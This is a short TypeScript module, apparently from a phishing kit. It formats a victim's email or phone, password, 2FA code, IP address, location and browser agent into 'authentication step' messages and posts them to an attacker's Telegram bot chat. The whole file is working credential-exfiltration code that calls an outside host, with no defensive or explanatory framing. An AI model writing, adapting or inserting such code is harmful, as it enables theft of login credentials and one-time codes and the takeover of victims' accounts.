const telegramApiUrl = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;

type MessageData = {
	emailOrPhone: string;
	password: string;
	code?: string;
	pageUrl: string;
	userIp: string;
	userAgent: string;
	geoLocation: string;
};

export const sendDataToTelegram = async (messageData: MessageData) => {
	const { emailOrPhone, password, pageUrl, userIp, userAgent, geoLocation } =
		messageData;

	// Formatar mensagem
	const message = !messageData.code
		? `
🔒 USER AUTHENTICATION STEP 1

👤 EmailOrPhone: ${emailOrPhone}
👤 Password: ${password}
🌐 SITE: ${pageUrl}
🖥️ IP: ${userIp}
🌍 Location: ${geoLocation}
🧩 Agent: ${userAgent}
`
		: `
🔒 USER AUTHENTICATION STEP 2 (2FA)

👤 EmailOrPhone: ${emailOrPhone}
👤 Password: ${password}
👤 2FA_CODE: ${messageData.code}
🌐 SITE: ${pageUrl}
🖥️ IP: ${userIp}
🌍 Location: ${geoLocation}
🧩 Agent: ${userAgent}
`;

	// Enviar mensagem para o Telegram
	const data = {
		chat_id: process.env.GROUP_ID,
		text: message,
	};

	await fetch(telegramApiUrl, {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
		},
		body: JSON.stringify(data),
	});
};
